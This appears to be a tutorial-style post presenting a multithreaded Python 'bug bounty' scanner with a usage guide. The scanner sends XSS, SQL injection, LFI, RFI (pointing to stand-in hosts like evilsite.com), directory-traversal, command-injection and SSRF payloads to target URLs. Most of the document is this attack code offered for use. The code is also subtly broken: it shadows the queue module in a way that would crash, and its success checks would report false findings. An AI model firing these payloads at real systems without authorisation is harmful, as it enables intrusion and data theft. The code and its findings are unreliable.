This tool is designed to be fast, easy to use, and feature-rich. It uses concurrency to speed up testing, runs multiple vulnerability checks, and generates detailed reports for each test.

import requests
import threading
import queue
import time
import json

# Payloads for different vulnerabilities
XSS_PAYLOADS = ["<script>alert('XSS');</script>", "<img src='x' onerror='alert(1);'>", "<svg/onload=alert(1)>"]
SQL_PAYLOADS = ["' OR 1=1 --", "' UNION SELECT NULL, username, password FROM users --", "' AND 1=1 --"]
CSRF_PAYLOAD = {"action": "delete", "item_id": "1"}
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/system32/drivers/etc/hosts"]
RFI_PAYLOADS = ["http://evilsite.com/malicious_payload.php", "http://malicious.com/malicious_file.txt"]
DIR_TRAVERSAL_PAYLOADS = ["../../../../etc/passwd", "../../../etc/hosts"]
COMMAND_INJECTION_PAYLOADS = ["; ls", "| ls", "$(ls)"]
SSRF_PAYLOADS = ["http://localhost:8080", "http://127.0.0.1/admin"]

# Queue to handle concurrent requests
queue_lock = threading.Lock()

# Function to test for XSS vulnerability
def test_xss(url, queue):
    for payload in XSS_PAYLOADS:
        response = requests.get(url, params={'search': payload})
        if payload in response.text:
            result = {"url": url, "vulnerability": "XSS", "payload": payload, "success": True}
            queue.put(result)

# Function to test for SQL Injection vulnerability
def test_sql_injection(url, queue):
    for payload in SQL_PAYLOADS:
        response = requests.get(url, params={'id': payload})
        if "SQL" in response.text or "error" in response.text:
            result = {"url": url, "vulnerability": "SQL Injection", "payload": payload, "success": True}
            queue.put(result)

# Function to test for CSRF vulnerability
def test_csrf(url, queue):
    response = requests.post(url, data=CSRF_PAYLOAD)
    if "delete" in response.text.lower():
        result = {"url": url, "vulnerability": "CSRF", "payload": CSRF_PAYLOAD, "success": True}
        queue.put(result)

# Function to test for LFI vulnerability
def test_lfi(url, queue):
    for payload in LFI_PAYLOADS:
        response = requests.get(url, params={'file': payload})
        if "root" in response.text or "passwd" in response.text:
            result = {"url": url, "vulnerability": "LFI", "payload": payload, "success": True}
            queue.put(result)

# Function to test for RFI vulnerability
def test_rfi(url, queue):
    for payload in RFI_PAYLOADS:
        response = requests.get(url, params={'file': payload})
        if "malicious" in response.text:
            result = {"url": url, "vulnerability": "RFI", "payload": payload, "success": True}
            queue.put(result)

# Function to test for Directory Traversal
def test_directory_traversal(url, queue):
    for payload in DIR_TRAVERSAL_PAYLOADS:
        response = requests.get(url, params={'file': payload})
        if "passwd" in response.text:
            result = {"url": url, "vulnerability": "Directory Traversal", "payload": payload, "success": True}
            queue.put(result)

# Function to test for Command Injection
def test_command_injection(url, queue):
    for payload in COMMAND_INJECTION_PAYLOADS:
        response = requests.get(url, params={'cmd': payload})
        if "error" in response.text or "command" in response.text:
            result = {"url": url, "vulnerability": "Command Injection", "payload": payload, "success": True}
            queue.put(result)

# Function to test for SSRF vulnerability
def test_ssrf(url, queue):
    for payload in SSRF_PAYLOADS:
        response = requests.get(url, params={'url': payload})
        if "localhost" in response.text or "admin" in response.text:
            result = {"url": url, "vulnerability": "SSRF", "payload": payload, "success": True}
            queue.put(result)

# Function to generate a report
def generate_report(results):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    report = []
    for result in results:
        report.append({
            'timestamp': timestamp,
            'vulnerability': result["vulnerability"],
            'url': result["url"],
            'payload': result["payload"],
            'success': result["success"]
        })
    return report

# Function to save report in JSON format
def save_report(report):
    with open("bug_bounty_report.json", "a") as f:
        json.dump(report, f, indent=4)
        f.write("\n")

# Main function to handle concurrency and vulnerability testing
def run_bug_bounty(target_urls):
    results = []
    queue = queue.Queue()

    # Thread worker function
    def worker(url):
        # Run vulnerability tests
        test_xss(url, queue)
        test_sql_injection(url, queue)
        test_csrf(url, queue)
        test_lfi(url, queue)
        test_rfi(url, queue)
        test_directory_traversal(url, queue)
        test_command_injection(url, queue)
        test_ssrf(url, queue)

    # Create threads for each URL
    threads = []
    for url in target_urls:
        thread = threading.Thread(target=worker, args=(url,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Collect all results from the queue
    while not queue.empty():
        results.append(queue.get())

    # Generate and save report
    report = generate_report(results)
    save_report(report)
    print("Bug bounty testing complete. Report saved in 'bug_bounty_report.json'.")

if __name__ == "__main__":
    target_urls = ["http://example.com/vulnerable-page1", "http://example.com/vulnerable-page2"]  # Add target URLs here
    run_bug_bounty(target_urls)

Key Features of the Tool:

    Concurrency:

        The tool uses Python's threading module to run multiple vulnerability tests concurrently. This speeds up the testing process when dealing with multiple URLs.

    Wide Range of Tests:

        The tool checks for common vulnerabilities such as XSS, SQL Injection, CSRF, LFI, RFI, Directory Traversal, Command Injection, and SSRF.

    Customizable Payloads:

        The payloads for each vulnerability type are easily customizable. You can expand them or replace them with your own set of test payloads.

    Detailed Reporting:

        The tool generates detailed reports in JSON format, which include the timestamp, vulnerability type, URL, payload used, and success status.

    Easy to Extend:

        The script is designed to be modular and extendable. You can add more tests or modify the existing tests easily.

How to Use the Tool:

    Install Dependencies:

        Ensure you have the requests library installed by running pip install requests.

    Set Up Target URLs:

        Modify the target_urls variable to include the list of URLs you want to test.

    Run the Script:

        Execute the script, and it will automatically test each URL for vulnerabilities.

    Check the Report:

        After testing, the script will save the results in a file called bug_bounty_report.json.

Example of Generated Report:

{
    "timestamp": "2025-04-22 14:30:12",
    "vulnerability": "XSS",
    "url": "http://example.com/vulnerable-page1",
    "payload": "<script>alert('XSS');</script>",
    "success": true
}
